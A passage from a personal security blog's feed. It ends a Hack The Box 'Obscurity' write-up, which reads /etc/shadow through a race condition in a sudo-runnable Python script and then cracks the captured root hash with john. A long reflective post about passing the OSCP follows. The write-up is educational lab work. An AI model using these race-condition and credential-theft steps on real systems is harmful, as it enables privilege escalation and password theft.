				Password: SecThruObsFTW
				
				robert@obscure:~$
				</code></pre><h2 id="root">root</h2>
				<p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p>
				<pre><code class="language-console" data-lang="console">$ ls -la BetterSSH
				total 12
				drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
				drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
				-rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
				</code></pre><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p>
				<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys
				<span style="color:#f92672">import</span> random<span style="color:#f92672">,</span> string
				<span style="color:#f92672">import</span> os
				<span style="color:#f92672">import</span> time
				<span style="color:#f92672">import</span> crypt
				<span style="color:#f92672">import</span> traceback
				<span style="color:#f92672">import</span> subprocess
				
				path <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>))
				session <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;user&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;authenticated&#34;</span>: <span style="color:#ae81ff">0</span>}
				<span style="color:#66d9ef">try</span>:
				session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter username: &#34;</span>)
				passW <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter password: &#34;</span>)
				
				<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/etc/shadow&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
				data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
				data <span style="color:#f92672">=</span> [(p<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;:&#34;</span>) <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;$&#34;</span> <span style="color:#f92672">in</span> p <span style="color:#66d9ef">else</span> None) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> data]
				passwords <span style="color:#f92672">=</span> []
				<span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> data:
				<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> x <span style="color:#f92672">==</span> None:
				passwords<span style="color:#f92672">.</span>append(x)
				
				passwordFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(p) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords])
				<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path, <span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
				f<span style="color:#f92672">.</span>write(passwordFile)
				time<span style="color:#f92672">.</span>sleep(<span style="color:#f92672">.</span><span style="color:#ae81ff">1</span>)
				salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
				realPass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
				<span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> passwords:
				<span style="color:#66d9ef">if</span> p[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> session[<span style="color:#e6db74">&#39;user&#39;</span>]:
				salt, realPass <span style="color:#f92672">=</span> p[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;$&#39;</span>)[<span style="color:#ae81ff">2</span>:]
				<span style="color:#66d9ef">break</span>
				
				<span style="color:#66d9ef">if</span> salt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span>:
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Invalid user&#34;</span>)
				os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
				sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
				salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$6$&#39;</span><span style="color:#f92672">+</span>salt<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;$&#39;</span>
				realPass <span style="color:#f92672">=</span> salt <span style="color:#f92672">+</span> realPass
				
				hash <span style="color:#f92672">=</span> crypt<span style="color:#f92672">.</span>crypt(passW, salt)
				
				<span style="color:#66d9ef">if</span> hash <span style="color:#f92672">==</span> realPass:
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Authed!&#34;</span>)
				session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
				<span style="color:#66d9ef">else</span>:
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Incorrect pass&#34;</span>)
				os<span style="color:#f92672">.</span>remove(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span><span style="color:#f92672">+</span>path)
				sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
				os<span style="color:#f92672">.</span>remove(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#39;/tmp/SSH/&#39;</span>,path))
				<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
				traceback<span style="color:#f92672">.</span>print_exc()
				sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
				
				<span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#39;authenticated&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
				<span style="color:#66d9ef">while</span> True:
				command <span style="color:#f92672">=</span> input(session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@Obscure$ &#34;</span>)
				cmd <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;sudo&#39;</span>, <span style="color:#e6db74">&#39;-u&#39;</span>,  session[<span style="color:#e6db74">&#39;user&#39;</span>]]
				cmd<span style="color:#f92672">.</span>extend(command<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34; &#34;</span>))
				proc <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(cmd, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stderr<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE)
				
				o,e <span style="color:#f92672">=</span> proc<span style="color:#f92672">.</span>communicate()
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Output: &#39;</span> <span style="color:#f92672">+</span> o<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>))
				<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Error: &#39;</span>  <span style="color:#f92672">+</span> e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#66d9ef">if</span> len(e<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;&#39;</span>)
				</code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
				<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
				Matching Defaults entries for robert on obscure:
				env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
				
				User robert may run the following commands on obscure:
				(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
				</code></pre><p>By analyzing the source code, we see that once you try to login with <code>BetterSSH</code>, there is a moment where <code>/etc/shadow</code> is open in read mode (posible due to execute <code>BetterSSH.py</code> with sudo!), and is written under <code>/tmp/SSH</code> on a file, later on the temporal <code>/etc/shadow</code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&rsquo;s try it.</p>
				<p>On one terminal, we execute <code>BetterSSH.py</code> with sudo:</p>
				<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
				Enter username: root
				Enter password: foo
				Incorrect pass
				</code></pre><p>And in another term, we execute a while true loop, that will be doing cat on the files under <code>/tmp/SSH</code>, and at some moment we confim the race condition we previously thought of as we have the content of <code>/etc/shadow</code> for the user root (remember the script is run with sudo):</p>
				<pre><code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
				root
				$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
				18226
				0
				99999
				7
				</code></pre><p>I grab that content of shadow and the one of <code>/etc/passwd</code>, run unshadow to generate a file compatible to john and crack it:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &gt; rootkey.txt
				root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt
				Using default input encoding: UTF-8
				Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
				--- SNIP ---
				mercedes         (root)
				--- SNIP ---
				Session completed
				</code></pre><p>And there we have the password of root user; <code>mercedes</code> and we succesfully login as root with it :D</p>
				<pre><code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
				Password:
				root@obscure:~# id
				uid=0(root) gid=0(root) groups=0(root)
				</code></pre><p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)</p>
				<p>I will try to be making some time to do write ups of some other machines, until next time!!</p>
				]]>
			</content>
		</item>
		<item>
			<title>
				A Journey in the Dark - An adventure's tale towards OSCP
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/
			</link>
			<pubDate>
				Mon, 27 Apr 2020 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/
			</guid>
			<description>
				Preface This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.
				Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.
			</description>
			<content type="html">
				<![CDATA[
				<img src="/images/blog/oscp/oscp_banner.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="preface">Preface</h2>
				<p>This is the story of how I got my OSCP coming from a background as Linux Sysadmin/DevOps as also which ones are my plans for the future.</p>
				<p>Every tale where there is an adventurer, starts with him (the adventurer) and his friends, these who share the journey providing support and advice through it, as the story moves forward, new characters tend to appear, joining the adventurer in his travel.</p>
				<p>This story is no less , then before than anything thanks to my buddies <a href="https://www.hackthebox.eu/home/users/profile/186934">r0xas</a>, <a href="https://www.hackthebox.eu/home/users/profile/12286">MrBulldops</a>, <a href="https://twitter.com/tagnullde">0x41</a> and <a href="https://www.hackthebox.eu/home/users/profile/43855">DutchPyro</a>, for helping and still help me in this adventures and the ones that will came.
				And most than anything <a href="https://www.linkedin.com/in/mquerves/">Mauri</a> because you just convinced to stop shitting myself, from &ldquo;I can&rsquo;t&rdquo; to &ldquo;I can&rdquo;.</p>
				<p><em>By the way, I really really love books (guess why the title of the post!), and I&rsquo;m really happy getting this cert during this C-19 thing (living abroad at this time, is though), so I just wanted to make this post in the way it makes me the happiest.</em></p>
				<h2 id="000-the-background">000: The background</h2>
				<p>At the ends of 2014 I started my first IT job, specifically as a Linux Sysadmin Junior, almost knowing nothing more than a few really basic concepts, in this place I got to learn a lot of stuff and was where I got to know awesome technicians and people, at this day all of them friends, and ones I consider the closest for me.
				From this forward, I kept advancing some seniorities and changed 2 times of job and moving abroad last year, currently working as a DevOps Engineer (tl;dr, it&rsquo;s been 5 years and going to 6), all the time learning new stuff, either at work or by myself, but never without stop learning.</p>
				<p>I don&rsquo;t hold any kind of degree most than High School. I started university but I moved abroad so, something I will neither earn in the future, all what I know, is by self-teaching. I&rsquo;m someone who loves to be ALL the time learning new stuff, to understand how stuff works, trying to replicate it, break it, play with it and see what happens, always enjoying the process of learning, either if there is no light and all is an &ldquo;I&rsquo;m stupid/I suck/I can&rsquo;t&rdquo; or that amazing moment when something clicks in and you turn into the most happiest person just because you learned something new regardless if it was something stupid or not.</p>
				<h2 id="001-my-preparation">001: My preparation</h2>
				<p>I always felt attracted to security but never felt confident to actually start learning about it, until November of last year that Mauri just made me make my mind. From this I started playing a bit in Hack The Box, all the time using hints, watching <a href="https://ippsec.rocks/">Ippsec videos</a> or learning new stuff by reading machine write-ups by <a href="0xrick.github.io/">0xrick</a> and by <a href="0xdf.gitlab.io/">0xdf</a>.
				I did (in this order): Postman, Traverxec, Lame, Bitlab, Bashed, Obscurity, Mango, AI and Craft (first one without hints), tried to do OpenAdmin but was unable to get the second user without hints, I decided I did not want to read more hints, so just put it for later (after PWK was pretty easy :D).</p>
				<p>I got 90 days and my lab time started the 5th of January, my way of approaching it was:</p>
				<ul>
				<li>I spent the first 2 weeks just going through the PDF and the Videos.</li>
				<li>Once I was done with this I started to the labs, but a few days after some personal problems arose and I was so stressed that I couldn&rsquo;t focus at nothing, so for around 1 - 2 weeks I stopped touching the labs (that I barely touched) or anything OSCP related.</li>
				<li>Storm ended, I started to play a bit everyday after work on the labs, this was around 1 - 2 hs per day, and on weekends tried to sessions of 8 - 12 hours.</li>
				<li>OSCP announced their upgrade to the new labs, being I still had time left (even going through some shit), and keeping in mind the amount of new material (from 300-ish pages on the PDF to 800-ish, and from 7-ish hs of videos to 18-ish hs of videos) I just decided it was worth to do the upgrade, so I did it.</li>
				<li>I got the new material and VPN, and started to play in the new labs, but at this time using the material more as reference on certain specific topics (example: Microsoft Office explotaition), this still being complemented with Ippsec + 0xrick and 0xdf write-ups.</li>
				</ul>
				<h2 id="010-my-lab-experience">010: My lab experience</h2>
				<p>As mentioned, of the 90 days I used way less than those for doing the labs, now before starting to play with them, I set some goals that I needed to achieve before the lab time ended, these goals were:</p>
				<ul>
				<li>Compromise in total at least 42 machines.</li>
				<li>Gain access to all the extra nets.</li>
				<li>Root on no less than 3 hosts per extra net.</li>
				<li>Completly root an extra net.</li>
				</ul>
				<p>I achieved all those goals, of the 42 machines I got 46 (of a total 75), got access to the 3 extra nets, compromised more than 3 hosts per net and fully rooted one; Dev 5 hosts, IT 4 hosts and Admin fully rooted.</p>
				<p>Personally for me, the labs are similar and at the same time different to Hack The Box, why? Because the labs are sort of like &ldquo;real&rdquo; basic nets, in the sense that there is a dependence between some hosts, you can&rsquo;t get one without first compromising another or even get to enumerate/discover other hosts, without first compromising N firewalls, the fact that there is nothing written, that you need to discover which host has dependence with which host, for me was really fun. Also in this aspect, it really helped having experience as sysadmin maintaining large amounts of servers across multiple networks, because in scale PWK nets were really small ones and without normal components you find in a real network, again basic &ldquo;real&rdquo; nets.</p>
				<p>On the other hand, the OSCP Exam itself, yes it is really HTB-like, you are given N machines, every machine having specific points, there are no dependencies, there is no looting needed, the only thing that is needed is to break independent machines, tl;dr: enumerate, enumerate, enumerate&hellip;enumerate, try, try harder, keep trying, repeat.</p>
				<p><strong>Now, one important point about PWK/OSCP vs HTB, with PWK/OSCP you pretty much 99% of the time will find a CVE (or just a public POC on exploit-db) for what you are trying to break, while HTB tends to be more misconfigurations and/or CTF stuff, this makes a lot of stuff on HTB harder than PWK/OSCP</strong></p>
				<h2 id="011-20200411---the-mock-exam">011: 20200411 - The Mock Exam</h2>
				<p>During the whole PWK, my biggest worry, was not breaking machines itself, no, it was two things:</p>
				<ul>
				<li>The report</li>
				<li>The proctored exam</li>
				</ul>
				<p>This was going to be the first time in my life needing to write down a report of something like an exam in english (english, is not my native language, and as I&rsquo;m self-teaching I lack a lot of stuff), so this was enough to put me in some sort of panic state, it was going to be so, so, so easy to fuck it up, I mean, I&rsquo;m sure while you are reading this, a lot of stuff had made your eyes cry because something is WRONG, so just imagine how much worried I was in this aspect!!</p>
				<p>And the second, the proctored exam, I&rsquo;m good at working under pressure (I worked under strict SLAs), but doing something with a deadline of 24 hs as OSCP is, while <em>being watched</em> that whole time? Personally for me, that was just a totally new thing, and one that made me to creep <em>A LOT</em>.</p>
				<p>To deal with those things, I thought about doing a Mock Exam (ONE week before the real one), what do I mean with a mock exam? Basically I was going to pick up 5 random machines from <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">HTB/Vulnhub OSCP-alike</a>, and starting at a similar time as the one of my OSCP, hack them in a time frame of 23 hs 45 minutes, if I run out of time and I was not able to do it, then I was not able to do it, no way around it, on top of this to get used to the proctoring I was going to do a live stream on youtube for the whole time I needed to get the machines or until running out of time, whichever happend first.
				For the report itself, I gave me more freedom with it, the aim yes, was to do something similar to what I should submit to Offensive Security, but as this was a completely new thing, and more easy for me to fuck up, I thought of it more as a learning experience, so no, no deadlines to do it. I&rsquo;m really grateful of doing it, because I ended indeed learning quite a lot about the process of what is worth to document, what is not, what I should I avoid, what notes <em>I MUST</em> always have to write down, etc.</p>
				<h4 id="00---the-live-streaming">00 - The Live Streaming</h4>
				<p>Days before the exam I asked to be chosen random machines from the list of alike-ones (link above in HTB/Vulnhub alike) and assign points to them, the list ended like this:</p>
				<ul>
				<li>Brainpan - 25 pts - BOF</li>
				<li>Bart - 25 pts</li>
				<li>Lightweight - 20 pts</li>
				<li>Arctic - 20 pts</li>
				<li>Optimum - 10 pts</li>
				</ul>
				<p>Something important to remark, the windows machine I used to the development of the exploit (BOF) was a free one provided by Microsoft that has a valid time of 3 months, so more than enough for this, it can be downloaded here:</p>
				<pre><code class="language-console" data-lang="console">https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/
				</code></pre><p>Finally, the 2020/04/11 I started doing a livestream on youtube, and ended rooting all the machines in around 14 hs. <strong>Worth to mention I cut the live stream at around those 14 hs, but youtube only uploaded 12 hs of video, this also was the first time I was streaming something and I didn&rsquo;t know OBS by default didn&rsquo;t do a recording of the videos while streaming, so I don&rsquo;t have the original video to upload the 2 hs missing, but if wanted I just can record that missing parts</strong>, said that, the streaming:</p>
				
				<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
				<iframe src="https://www.youtube.com/embed/FwZc6JigIcE" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
				</div>
				
				<h4 id="01---note-taking">01 - Note Taking</h4>
				<p>When I started my notes were pure shit, I&rsquo;m sure they still are, but are way better than what they were before. For taking/keeping notes through all the PWK and OSCP, I used Cherrytree, I started with <a href="https://411hall.github.io/assets/files/CTF_template.ctb">this template</a>, but as I moved forward and my own methodology started to develop I modified some stuff, the result was having this template:</p>
				<pre><code class="language-console" data-lang="console">https://pruthvirajbhat.github.io/files/oscp/template_pwk.ctb
				</code></pre><p><strong>Note:</strong> Something I didn&rsquo;t know during the exam, is that in the past some pepole has lost their notes of Cherrytree because the files got corrupted, then they were unable to  prepare their reports, my advice then is, maybe start with Cherrytree, and as time moves on, switch to some another tool for notetaking, such as <a href="https://joplinapp.org/">joplin</a> or <a href="https://notion.so/">Notion</a> to mention two examples, you will already have some methodology developed or starting to, so it will be easier to create a template adapted to yourself.</p>
				<h4 id="10---the-report">10 - The Report</h4>
				<p>Now, for the report I decided to ditch the doc/.odf templates and just go with something I&rsquo;m more comfortable: Markdown.
				For that I ended using the <a href="https://github.com/noraj/OSCP-Exam-Report-Template-Markdown">template created by noraj</a>, which using Eisvogel and LaTeX, the markdown is converted to .pdf.
				Keep in mind that this has some <em>HEAVY</em> requirements when it comes to packages, you need to install around 5 GB and I was too lazy to be honest for figuring out exactly which what packages were needed.
				In summary you need to install <a href="https://pandoc.org/installing.html">pandoc</a>, <a href="https://github.com/Wandmalfarbe/pandoc-latex-template#required-latex-packages">LaTeX</a> and the <a href="https://github.com/Wandmalfarbe/pandoc-latex-template/blob/master/eisvogel.tex">Eisvogel template</a>. Having that done is just a matter of edition with your favourite text editor, I used VS Code.
				If you want to read a bit more in deep about this, I recommend you to read <a href="https://www.tagnull.de/post/oscp-reporting/">this post by 0x41</a>, or watch the following video by John Hammond talking about this subject:</p>
				
				<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
				<iframe src="https://www.youtube.com/embed/MQGozZzHUwQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
				</div>
				
				<p>This is the PDF report of the simulation done at the Live Streaming on Youtube:</p>
				<pre><code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.pdf
				</code></pre><p>And this, is the markdown code to generate the PDF above:</p>
				<pre><code class="language-console" data-lang="console">https://github.com/ceso/ceso.github.io/blob/master/files/oscp/OSCP-OS-42-Simulation-Report.md
				</code></pre><h2 id="100-20200418---the-big-day">100: 20200418 - The Big Day</h2>
				<p>After the simulation, the big day of the exam just arrived, 2020/04/18 at 15 hs started my exam. I didn&rsquo;t do any kind of weird preparation for it, more than keeping a Cherrytree template with the 5 machines ready before the exam (using the one I posted above hosted on this blog), set a sharing folder between my host machine and kali (for not in the world, I wanted something crashing and end up losing everything just because I write only inside the VM), kept ready the templates on markdown for the report of the exam, and a FULL NIGHT OF SLEEP the day before (which I asked as day-off).</p>
				<p>Describing now my exam, it went as follows:</p>
				<p>I left running in parallel 4 Full NMaps against all the machines except for the one of the BOF and the Development one for it.
				Afterwards I proceeded to start with the BOF really confident about it while the nmaps run, I got confused counting badchars, and ended spending quite some time on this&hellip;took me more than what it should. Once I was finished with the BOF, I jumped straight into reading the results of the nmaps.</p>
				<p>Five hours after starting the exam, I was feeling really blue, I didn&rsquo;t got anything else than the BOF, was enumerating the two 20 points, in one I found a public exploit but no matter what I was trying, I couldn&rsquo;t make it to work, and the other one, I was extremely in a tunnel vision because I was not able to bypass a filter, this last thing I tried for over 3 hs I think or even more, I was feeling really really bad. The hours keep going and still, only BOF, only 25 pts, more than 5/7 hs used, and still nothing else, I stopped to have some dinner and try to cool down, once I came back I kept aside the the one for bypassing the filter and BANG ended in a post of 0xdf where he referenced an alternative exploit for the software I was trying to exploit in the 20 pts machine, and&hellip;foothold! it worked at first, I was still feeling pretty bad, I was going to lose&hellip;
				I returned to the one with the bypass and, suddenly I realized what I was trying was a rabbit-hole, and literally the first thing I tried hours before was the way to go, I only didn&rsquo;t notice it worked at that time, awesome! in less than 1 hour or 2 I got user on the two 20 machines, the landscape started to be nice a gain. One or two hours later, I was submitting the proof of root of one of those 20 pts machine, now I had under my score 45 pts, with 25 more I was going to be able to pass&hellip;BUT nothing is always so nice&hellip;I ended spending ALL the night trying to get root in the remaining 20 pts machine, when I realized outside was already daylight again, it was around 7 am, my mental strenght was like shit, my mood was extremly blue, I was convinced I was going to fail the exam, only thing I wanted was to sleep, was to give up, and even maybe not taking a 2nd attempt again, the mix between feling sososo tired plus feeling so stupid because the performance I was having while on the simulation it went that good, it was raping me, I gave up and stopped to take a nap of around 1 h or 1 and half, once I woke up I came back to keep trying this root on the remaining 20 pts, no luck, I was destroyed, I was extremly sad, again&hellip;gave up with this machine and thought about tring the 10 pts to at least have something more, around 30 - 40 minutes later, 10 points more to the score, ok great it&rsquo;s 55 pts, is still NOT enough to pass the exam, I guess I will just try to get at least until user on the 25 pts, to have a bit more of confident with myself&hellip;&ldquo;I tried, I tried&rdquo;, 2 hours later I had submitted the proof of the 25 machine, my mood literally changed, I was &ldquo;re-charged&rdquo; again, I had 80 pts, now I was sure I was able to pass, I couldn&rsquo;t belive it, restarted the machine and did this step once more to confirm it and YES, I indeed rooted it, I was now in the other side, but now with this re-charged mood, having enough points, I decided to keep fighting until the end, to try until the very end of the exam to see if I was able to root the remaining 20 pts machine, found quite a lot of stuff, nothing though that gave me the privilege escalation I needed.
				I decided was the time to have some refresh, stopped this and just started to re-do all the prior machines, to be sure the vectors were totally correct and 100% reproducible, that I had all the documentation about them that I needed, AND that I have had submitted the flags correctly, I&rsquo;m extremely glad I did this last thing, because I noticed I submitted the root proof of the 20 machines I rooted, in the one that no.
				Once ended with this, I came back to the game trying the root on the remaining 20 pts&hellip;hours later the exam had ended, but at least with enough points to pass, getting access to 5 out of 5, and without using my metasploit allowance :P (saved it, and never used it lol).</p>
				<p>I took a nap of around 1 hour, and I had some lunch, from this I started to work on my report, when I realized I had it finished at 4 am, I reviewed it around 4 or 5 times, and went to sleep. Next day I did some more reviews and finally submitted it around 10 am, so between the 18 and 20, I only slept around 5/6 hs with luck.</p>
				<p>Through all the exam, I took a lot of short rests of sometimes 10 minutes, sometimes 30 minutes, at some moments every 2 hours at others every 3 hours, you will notice when you need to take a break, just make sure you take them, don&rsquo;t let your self fall into the tempting of not doing it, thinking it will save you time, a break is important as keep pushing.</p>
				<p>Talking a bit on the official chat of HTB, I was told that all the community thinks that when you get half-user, that&rsquo;s half the points, so I ended with the thought I got 90 pts (instead the 80 I thought at first), as the remaining 20 pts, I got the user, but not the root (even if I wasn&rsquo;t able to do PE, in my report I included all my findings and personal thoughts about it).</p>
				
				<img src="/images/blog/oscp/certificate.jpg"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="101-cheatsheet">101: Cheatsheet</h2>
				<p>Something that I found really helpful during the exam, is the <a href="https://pruthvirajbhat.github.io/posts/2020/04/hacking/oscp-cheatsheet/">cheatsheet</a> I made along the course as also all the different resources I normally tend to go looking for some references stuff (for example PayloadAllTheThings), you can find a direct link to my Cheatsheet always in the upper right corner of the blog.</p>
				<p>Take cheatsheets from other people, start figuring out what stuff is the one you use the more, what&rsquo;s helpfull, what is granted you will not remember, try to develop your own as you progress to the labs, it is really helpfull and also helps to &ldquo;solidify&rdquo; more the stuff in your mind.</p>
				<h2 id="110-a-look-into-the-future">110: A look into the future</h2>
				<p>Yesterday 2020/04/26 I woke up having a message from Off Sec saying I passed, such a good way to wake up, passing OSCP at my first attempt during one of the most shitty moments I have ever lived :).
				Now from here, my plans are keep learning more and more as I can about Infosec (HTB FTW), my next goal is to learn some basics of Binary Analysis/Reverse Engineering as also learn more in deep about Active Directory attacks as attacks to Clouds (either AWS/Azure/GCP), whichever it is, there is going to be a huge puzzle ahead, a neverending learning, and is there anything better than that? I don&rsquo;t really think so&hellip;</p>
				<p>Thanks for reading until the end in case you were able to, and again as said at the beginning I really didn&rsquo;t want to do a &ldquo;normal post&rdquo;, but more something of my own reflecting how do I feel and stuff I love to do. The name of the title is a reference to the chapter of a book, one I really like, and also I felt it goes well with this new world I&rsquo;m trying to move, one where everything tends to be &ldquo;dark&rdquo; either from the impact it has on media (where terms are wrong used), and also I see it as a synonym of &ldquo;deep&rdquo;, being there are some concepts that you need to &ldquo;dig deep&rdquo; to where is &ldquo;dark&rdquo; for stuff to click.</p>
				<h2 id="111-one-last-tip">111: One last tip</h2>
				<p>Keep Trying, but keep trying harder, when you think there is no light and no hope, just don&rsquo;t give up, a lot of stuff can change in a few hours (I know it myself :P).
				Don&rsquo;t think of &ldquo;Try Harder&rdquo; as you need to exprime more your brain, but as don&rsquo;t giving up and giving all you have until the very last second if is needed, of course trying to not get burn out and keeping in mind you are doing it for fun, because you enjoy it.
				Take rests, eat, be aware what you are lacking on your documentation and what is excessing, learn to be self-aware of your weakness (mind SQLI and Windows).</p>
				<p><strong>But again most important: Keep trying harder!!</strong></p>
				<p><em>Note: Please let me know any fix needed on the text or whatever, it also helps to keep improving my english :P</em></p>
				]]>
			</content>
		</item>
		<item>
			<title>
				Hacking/OSCP cheatsheet
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/04/hacking/oscp-cheatsheet/
			</link>
			<pubDate>
				Tue, 07 Apr 2020 02:30:30 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/04/hacking/oscp-cheatsheet/
			</guid>
			<description>
				Hacking/OSCP Cheatsheet Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff. But this is basically the tools I tend to relie and use in this way the most. Hope is helpfull for you!
				Enumeration Network discoverie Nmap I tend to run 3 nmaps, an initial one, a full one and an UDP one, all of them in parallel:
			</description>
			<content type="html">
				<![CDATA[
				<h1 id="hackingoscp-cheatsheet">Hacking/OSCP Cheatsheet</h1>
				<p>Well, just finished my 90 days journey of OSCP labs, so now here is my cheatsheet of it (and of hacking itself), I will be adding stuff in an incremental way as I go having time and/or learning new stuff.
